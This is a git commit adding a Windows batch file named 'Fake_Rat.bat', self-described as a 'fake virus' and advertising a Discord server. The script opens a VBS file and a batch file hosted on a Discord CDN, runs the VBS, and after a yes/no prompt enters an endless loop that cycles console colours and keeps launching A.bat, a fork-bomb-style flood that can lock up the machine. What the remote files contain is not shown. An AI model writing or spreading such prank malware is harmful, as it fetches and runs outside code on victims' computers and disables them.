82345c7b63840e6e4a0da78d392627eb23b1c8ef
NebulaModManager <152128444+BongBongWee@users.noreply.github.com>
2024-07-02 04:11:12 -0400

    Add files via upload

---
+++ Fake_Rat.bat
@@ -0,0 +1,248 @@
+@echo off
+
+title Fake virus made by Malachi. Join discord.gg/Y3wuBxRBEW
+
+start https://cdn.discordapp.com/attachments/1188646022180765766/1190147767813816370/msg.vbs?ex=65a0be7b&is=658e497b&hm=d2c17e71584c60ed7be67185caac06c87632b29985f6342e936026f8e037962f&
+cls
+timeout /t 3 /nobreak >nul
+start https://cdn.discordapp.com/attachments/1188646022180765766/1190150656972038184/A.bat?ex=65a0c12c&is=658e4c2c&hm=703c28e597ce66df6072d14747bd712c6f785f75f27f00c278b11f12e2db736c&
+cls
+
+
+cscript /nologo msg.vbs
+
+color 4
+echo FINAL WARNING!!!!!!
+echo Are you sure you want to run this program?
+choice /c:NY /n /m "Yes or No:"
+
+
+if errorlevel 1 set "key=N"
+if errorlevel 2 set "key=Y"
+
+if "%key%"=="N" (
+    echo Good choice
+    timeout /t 2 /nobreak >nul
+    exit
+) else (
+cls 
+:A
+echo YOU SHOULD HAVE CLICKED NO!!!
+timeout /t 1 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+start A.bat
+timeout /t 0 /nobreak >nul
+color 44
+timeout /t 0 /nobreak >nul
+color 54
+start A.bat
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+start A.bat
+timeout /t 0 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+start A.bat
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+timeout /t 0 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+start A.bat
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+timeout /t 0 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+start A.bat
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+start A.bat
+timeout /t 0 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+timeout /t 0 /nobreak >nul
+color 14
+start A.bat
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+start A.bat
+timeout /t 0 /nobreak >nul
+color 94
+timeout /t 0 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+timeout /t 0 /nobreak >nul
+color 14
+start A.bat
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+start A.bat
+timeout /t 0 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+start A.bat
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+start A.bat
+timeout /t 0 /nobreak >nul
+color 94
+timeout /t 0 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+timeout /t 0 /nobreak >nul
+color 54
+start A.bat
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+start A.bat
+timeout /t 0 /nobreak >nul
+color 14
+timeout /t 0 /nobreak >nul
+color 24
+timeout /t 0 /nobreak >nul
+color 34
+timeout /t 0 /nobreak >nul
+color 44
+start A.bat
+timeout /t 0 /nobreak >nul
+color 54
+timeout /t 0 /nobreak >nul
+color 64
+timeout /t 0 /nobreak >nul
+color 74
+timeout /t 0 /nobreak >nul
+color 84
+timeout /t 0 /nobreak >nul
+color 94
+start A.bat
+timeout /t 0 /nobreak >nul
+goto A
+)
